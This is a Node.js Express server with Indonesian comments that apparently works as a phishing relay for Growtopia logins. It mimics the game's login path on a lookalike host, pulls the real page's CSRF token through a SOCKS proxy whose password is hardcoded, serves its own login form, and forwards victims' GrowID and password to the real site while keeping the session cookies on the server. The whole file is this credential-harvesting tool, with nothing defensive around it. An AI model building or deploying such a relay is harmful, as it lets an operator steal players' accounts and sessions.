// server.js (ESM)
import express from "express";
import cookieParser from "cookie-parser";
import crypto from "crypto";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import { CookieJar } from "tough-cookie";
import got from "got";
import { SocksProxyAgent } from "socks-proxy-agent";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ====== KONFIG ======
const SOCKS_URL = "socks5://proxy:proxy@194.49.79.157:1080"; // ganti kalau perlu
const LOGIN_TOKEN_URL =
  "https://login.growtopiagame.com/player/growid/login?token=eu7D9Z3ok7kvrDCkszn4NnBIDC1S92SfHLaVObAvyBy7Y7qZo49h%2FuqzRXsmDgfrnBi7G6IcodH7v%2FV9IXjb%2BphQuHKQs31F4R7oo%2B%2Fd3bVaW9JsSSf2WYqdR5T1rq8V6hX0mUgaFY0SOUtW0MAlODKID5IY8%2FzwhFr9C0gI0lc1W49aJtWUVZJqu8AF0eJQs31QxupU2JiApoc30%2BiL8Z4NRGEHuuPnprhxLQO%2BjNrKEiJ1WmnIvbTcvHmeOIvPIMeJmNGADmTgwEjI0zNuW54FKFLkAUN0fuvj8ANX%2FXQHHgfCh%2FlN%2BGXYjtIMOHikfj5JlQ8njs2aw%2BLcftcqhlbxOZcwxbtJ3kb4nOXP%2BdT7PuL31f8CsssWJn44xPmRQcn%2FAmImlvELTSK01KFOeZ2dLSWPRfniVxtYA5cMnEWAwRxVYv5gRgXqN3eHI%2BLV4FXTwBqIp5zg%2FbJWp1QANWXAOnBzgtR%2FuzEl6f74bSloPnG5E1DyN5qHMNh%2FRUiA7DL6Nj3ht5SzngzX4PITnzV%2FsVUAHLP9nUeKprp6rLI%3D";
const REMOTE_VALIDATE_URL =
  "https://login.growtopiagame.com/player/growid/login/validate";

// ====== STATE SESSION SEDERHANA ======
/** sid -> { jar: CookieJar, token: string } */
const sessions = new Map();

// ====== AGENT SOCKS SHARED ======
const agent = {
  http: new SocksProxyAgent(SOCKS_URL),
  https: new SocksProxyAgent(SOCKS_URL),
};

// ====== APP ======
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// Redirect root ke /player/growid/login (termasuk saat host lp6-login.vercel.app)
app.get("/", (req, res) => {
  // opsi: jaga canonical (https) kalau di domain publik
  // if (req.headers.host === "lp6-login.vercel.app" && req.protocol !== "https") {
  //   return res.redirect(301, `https://${req.headers.host}/player/growid/login`);
  // }
  return res.redirect("/player/growid/login");
});

// ====== UTIL ======
function newSid() {
  return crypto.randomBytes(16).toString("hex");
}
function ensureSession(req, res) {
  let { sid } = req.cookies || {};
  if (!sid || !sessions.has(sid)) {
    sid = newSid();
    sessions.set(sid, { jar: new CookieJar(), token: "" });
    res.cookie("sid", sid, { httpOnly: true, sameSite: "lax" });
  }
  return sid;
}
function ua() {
  return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
}

// ====== ROUTES ======

// GET /player/growid/login -> inject _token ke views/login.html
app.get("/player/growid/login", async (req, res) => {
  const sid = ensureSession(req, res);
  const sess = sessions.get(sid);

  try {
    const resp = await got(LOGIN_TOKEN_URL, {
      agent,
      cookieJar: sess.jar,
      headers: { "User-Agent": ua(), "Accept": "text/html,*/*" },
      followRedirect: true,
      timeout: { request: 20000 }
    });

    const html = resp.body || "";
    const m = html.match(/name="_token"[^>]*value="([^"]+)"/i);
    if (!m) return res.status(502).send("<pre>_token tidak ditemukan dari halaman remote.</pre>");
    sess.token = m[1];

    const tpl = await fs.readFile(path.join(__dirname, "views", "login.html"), "utf8");
    const finalHtml = tpl.replace("__TOKEN__", sess.token);
    res.status(200).send(finalHtml);
  } catch (err) {
    res.status(500).send(`<pre>Gagal fetch login page: ${err.message || String(err)}</pre>`);
  }
});

// POST /player/growid/validate -> forward ke remote validate via SOCKS + cookieJar session
app.post("/player/growid/validate", async (req, res) => {
  const sid = ensureSession(req, res);
  const sess = sessions.get(sid);

  const { growId, password } = req.body || {};
  if (!growId || !password) {
    return res.status(400).send("<pre>growId & password wajib diisi.</pre>");
  }
  if (!sess.token) {
    return res.status(440).send("<pre>Session token kosong. Buka /player/growid/login dulu.</pre>");
  }

  try {
    const resp = await got.post(REMOTE_VALIDATE_URL, {
      agent,
      cookieJar: sess.jar,
      form: { _token: sess.token, growId, password },
      headers: {
        "User-Agent": ua(),
        "Accept": "text/html,application/json;q=0.9,*/*;q=0.8",
        "Origin": "https://login.growtopiagame.com",
        "Referer": LOGIN_TOKEN_URL
      },
      throwHttpErrors: false,
      timeout: { request: 20000 }
    });

    const ctype = (resp.headers["content-type"] || "").toLowerCase();
    if (ctype.includes("application/json")) {
      return res.status(resp.statusCode).type("application/json").send(resp.body);
    }
    return res.status(resp.statusCode).send(resp.body);
  } catch (err) {
    res.status(500).send(`<pre>Gagal POST validate: ${err.message || String(err)}</pre>`);
  }
});

// ====== START ======
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`RUN: http://localhost:${PORT}`);
  console.log(`Login form: http://localhost:${PORT}/player/growid/login`);
});
